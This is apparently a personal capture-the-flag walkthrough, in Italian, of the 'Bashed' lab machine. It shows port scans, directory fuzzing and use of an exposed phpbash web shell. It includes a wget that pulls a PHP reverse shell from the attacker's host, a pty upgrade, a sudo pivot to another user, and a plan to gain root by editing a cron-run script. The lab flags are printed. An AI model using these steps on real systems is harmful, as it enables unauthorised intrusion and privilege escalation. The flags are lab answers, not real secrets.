@@ -1,0 +1,191 @@
+10.10.10.68
+
+masscan -p1-65535 10.10.10.68 --rate 1000 --open --banners -e tun0
+nmap -sC -sV 10.10.10.68
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 15:06 CEST
+Nmap scan report for 10.10.10.68
+Host is up (0.23s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+il sito punta a una reverse shell php
+https://github.com/Arrexel/phpbash
+
+phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!
+
+quindi probabilmente questa macchina già contiene il file php, solo che non conosco la directory.
+
+provo a fare fuzzing:
+
+
+
+---- Scanning URL: http://10.10.10.68/ ----
+==> DIRECTORY: http://10.10.10.68/css/                                                                              
+==> DIRECTORY: http://10.10.10.68/dev/                                                                              
+==> DIRECTORY: http://10.10.10.68/fonts/                                                                            
+==> DIRECTORY: http://10.10.10.68/images/                                                                           
++ http://10.10.10.68/index.html (CODE:200|SIZE:7743)                                                                
+==> DIRECTORY: http://10.10.10.68/js/                                                                               
+==> DIRECTORY: http://10.10.10.68/php/                                                                              
++ http://10.10.10.68/server-status (CODE:403|SIZE:299)                                                              
+==> DIRECTORY: http://10.10.10.68/uploads/                                                                          
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/dev/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/php/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.10.68/uploads/ ----
++ http://10.10.10.68/uploads/index.html (CODE:200|SIZE:14)                                                          
+                                                                                                                    
+-----------------
+END_TIME: Fri Oct 22 15:37:27 2021
+DOWNLOADED: 9224 - FOUND: 3
+
+
+infatti sotto /dev ci sono già i file php
+
+andando a http://10.10.10.68/dev/phpbash.php c'è la shell disponibile:
+
+www-data@bashed:/var/www/html/dev# id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+www-data@bashed
+:/var/www/html/dev# ls /home
+
+arrexel
+scriptmanager
+
+www-data@bashed
+:/var/www/html/dev# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+
+già con utente www-data si riesce ad ottenere il flag user sotto /home/arrexel/user.txt:
+
+2c281f318555dbc1b856957c7147bfc1
+
+
+tra l'altro come www-data posso eseguire tutti i comandi come scriptmanager senza inserire la pwd, questo potrebbe essere unpossibile path verso root 
+
+usando sudo -u scriptmanager <comando>
+rieso a eseguire comandi come scriptmanager ma non posso fare quasi nulla perchè la shell non è persistent quindi non riesco ad ottenere una vera shell come scriptmanager
+per ottenrela provo a fare reverse shell, provo vari comandi ma non funziona nessuno, ora che sono dentro però posso semplicemente aggiungere dei file all'interno delle ricetory del sito ed eseguirli dal browser
+come faccio per la shell che sto usando ma al posto di creare una shell direttamente ne faccio una remota.
+per farlo posso usare qualunque script per creare reverse shell ad esempio in php (che sono sicuro che sul server c'è)
+
+sulla mia macchina:
+
+python3 -m http.server 1234
+
+su target in dir uploads (raggiungibile da browser ho verificato prima):
+wget http://10.10.16.2:1234/php_rev_shell.php
+
+ora basta andare su http://10.10.10.68/uploads/php_rev_shell.php per ottenrer una rev shell sul listener netcat
+
+upgrade shell a tty:
+    python -c 'import pty; pty.spawn("/bin/bash")'
+
+a questo punto posso fare privesc verso scriptmanager
+
+sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/$ id
+id
+uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
+
+
+sotto / :
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
+drwx------   2 root          root          16384 Dec  4  2017 lost+found
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
+drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
+lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
+drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
+drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
+drwx------   3 root          root           4096 Dec  4  2017 root
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
+dr-xr-xr-x 124 root          root              0 Oct 22 05:59 proc
+drwxr-xr-x  19 root          root           4240 Oct 22 05:59 dev
+drwxr-xr-x  18 root          root            520 Oct 22 06:25 run
+dr-xr-xr-x  13 root          root              0 Oct 22 07:34 sys
+drwxrwxrwt  10 root          root           4096 Oct 22 07:37 tmp
+
+
+in scripts:
+
+
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+-rw-r--r--  1 root          root            12 Oct 22 07:37 test.txt
+
+
+test.py:
+
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+
+
+quindi test.py viene eseguito da root (visto che il file creato test.txt è root)
+
+ma viene anche eseguito ogni minuto (coime sui puo vedere dalla data delk file .txt)
+
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+-rw-r--r--  1 root          root            12 Oct 22 07:50 test.txt
+
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+-rw-r--r--  1 root          root            12 Oct 22 07:51 test.txt
+
+visto ceh possiamo modificare test.py (è di prop di scriptmanager) basta mettere all'internpo i codice per aprire un'altra rev shell e verrà aperta come root (python2 non python3)
+
+cc4f0afe3a1026d402ba10329674a8e2
+
+
+
+
+                               
+
